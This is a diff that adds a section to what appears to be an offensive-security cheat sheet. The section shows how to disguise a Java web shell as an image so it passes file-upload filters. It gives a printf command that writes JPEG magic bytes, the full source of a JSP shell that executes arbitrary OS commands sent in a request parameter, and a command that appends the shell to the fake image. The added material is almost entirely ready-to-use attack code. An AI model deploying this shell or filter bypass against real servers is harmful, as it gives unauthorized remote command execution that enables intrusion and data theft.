@@ -3403,6 +3403,47 @@ GIF89a;
 ?>
 ```
 
+#### JAVA Web Shell Upload Filter Bypass
+
+```c
+$ printf "\xff\xd8\xff\n" > <FILE>.jpg
+```
+
+##### shell.jsp
+
+```java
+<%@ page import="java.io.*, java.util.*, java.net.*" %>
+<%
+    String action = request.getParameter("action");
+    String output = "";
+
+    try {
+        if ("cmd".equals(action)) {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                Process p = Runtime.getRuntime().exec(cmd);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output += line + "\\n";
+                }
+                reader.close();
+            }
+        } else {
+            output = "Unknown action.";
+        }
+    } catch (Exception e) {
+        output = "Error: " + e.getMessage();
+    }
+    response.setContentType("text/plain");
+    out.print(output);
+%>
+```
+
+```c
+$ cat shell.jsp >> <FILE>.jpg
+```
+
 ## mitmproxy
 
 ```c
